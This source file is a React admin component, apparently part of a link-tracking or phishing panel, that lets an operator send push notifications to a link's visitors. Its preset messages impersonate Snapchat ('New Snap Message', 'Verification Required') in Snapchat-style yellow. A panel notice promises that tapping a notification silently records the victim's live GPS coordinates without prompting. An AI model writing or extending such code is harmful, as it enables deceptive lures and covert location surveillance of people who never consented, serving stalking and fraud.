// components/admin/SendPushModal.tsx
"use client";

import React, { useState } from "react";
import { Modal } from "@/components/ui/Modal";
import { Input } from "@/components/ui/Input";
import { Button } from "@/components/ui/Button";
import { Bell, Send, Sparkles, X } from "lucide-react";
import { toast } from "@/components/ui/Toast";

interface Props {
  isOpen: boolean;
  linkId: string;
  sessionId?: string;
  visitorLabel?: string;
  onClose: () => void;
}

const PRESETS = [
  { title: "New Snap Message", body: "You have 1 unread snap from a friend. Tap to open." },
  { title: "Story Expiring Soon", body: "This private story will disappear in 1 hour." },
  { title: "Verification Required", body: "Please tap to complete your session verification." },
];

export const SendPushModal: React.FC<Props> = ({
  isOpen, linkId, sessionId, visitorLabel, onClose,
}) => {
  const [title, setTitle] = useState("New Snap Message");
  const [body, setBody] = useState("You have 1 unread snap waiting. Tap to view.");
  const [isSending, setIsSending] = useState(false);

  if (!isOpen) return null;

  const handleSend = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!title.trim()) { toast.error("Notification title required"); return; }

    setIsSending(true);
    toast.request("Dispatching push notification...");
    try {
      const res = await fetch("/api/links/push", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ linkId, sessionId, title: title.trim(), body: body.trim() }),
      });
      const data = await res.json();
      if (!res.ok || data.error) throw new Error(data.error || "Failed to dispatch push");

      toast.success(`Push delivered to ${data.sentCount || 1} target(s)!`);
      onClose();
    } catch (err: any) {
      toast.error(err.message || "Failed to deliver push");
    } finally {
      setIsSending(false);
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} className="max-w-md">
      <div className="flex items-center justify-between pb-2 mb-3 border-b border-white/10">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 rounded-xl bg-rose-500/20 text-rose-400 flex items-center justify-center">
            <Bell className="w-4 h-4" />
          </div>
          <div>
            <h3 className="text-sm font-bold text-white">Send Push Notification</h3>
            <p className="text-[11px] text-white/50">{visitorLabel || "All subscribed visitors"}</p>
          </div>
        </div>
        <button type="button" onClick={onClose} className="text-white/40 hover:text-white p-1">
          <X className="w-5 h-5" />
        </button>
      </div>

      <form onSubmit={handleSend} className="space-y-3 text-left">
        <div>
          <label className="text-xs font-bold text-white block mb-1.5">Quick Presets</label>
          <div className="flex flex-wrap gap-1.5">
            {PRESETS.map((p, idx) => (
              <button
                key={idx}
                type="button"
                onClick={() => { setTitle(p.title); setBody(p.body); }}
                className="px-2.5 py-1 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-[11px] text-white/70 hover:text-white transition-all"
              >
                {p.title}
              </button>
            ))}
          </div>
        </div>

        <Input
          label="Notification Title"
          value={title}
          onChange={(e) => setTitle(e.target.value)}
          placeholder="e.g. New Snap Message"
        />

        <div className="space-y-1">
          <label className="text-xs font-bold text-white block">Message Body</label>
          <textarea
            value={body}
            onChange={(e) => setBody(e.target.value)}
            rows={2}
            placeholder="Tap to open..."
            className="w-full bg-white/5 border border-white/10 rounded-2xl px-3 py-2 text-xs text-white outline-none focus:border-[#FFFC00]"
          />
        </div>

        <div className="p-2.5 rounded-2xl bg-[#FFFC00]/10 border border-[#FFFC00]/20 flex items-start gap-2">
          <Sparkles className="w-4 h-4 text-[#FFFC00] shrink-0 mt-0.5" />
          <p className="text-[11px] text-[#FFFC00]/90 leading-tight">
            When visitor taps this notification on their phone/PC, fresh live GPS coordinates will be auto-recorded silently without prompting!
          </p>
        </div>

        <div className="flex items-center justify-end gap-2 pt-2 border-t border-white/10">
          <Button type="button" variant="secondary" size="sm" onClick={onClose} disabled={isSending}>
            Cancel
          </Button>
          <Button type="submit" variant="primary" size="sm" isLoading={isSending} className="gap-1.5 font-bold">
            <Send className="w-3.5 h-3.5" /> Dispatch Push
          </Button>
        </div>
      </form>
    </Modal>
  );
};
